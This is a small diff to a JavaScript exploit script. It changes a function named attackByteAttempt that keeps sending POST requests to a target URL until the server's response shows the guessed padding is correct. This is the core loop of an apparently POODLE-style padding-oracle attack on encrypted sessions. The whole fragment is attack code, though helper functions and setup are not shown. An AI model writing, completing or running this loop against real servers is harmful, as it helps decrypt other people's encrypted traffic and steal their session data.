@@ -20,10 +20,9 @@ function sendRequest(method, url, data, callback, errorcallback, timeout) {
 }
 
 function attackByteAttempt(path, data, success) {
-	sendRequest('POST', targetUrl + "/" + path, data, null, function(status, message) {
-		// replace 1 == 1 with a check whether the ssl session was terminated
-		if (1 == 1) attackByteAttempt(path, data, success);
-		else success();
+	// If the request is successful (even though we get a 404), we have the padding correct
+	sendRequest('POST', targetUrl + "/" + path, data, success, function(status, message) {
+		attackByteAttempt(path, data, success);
 	});
 }
 
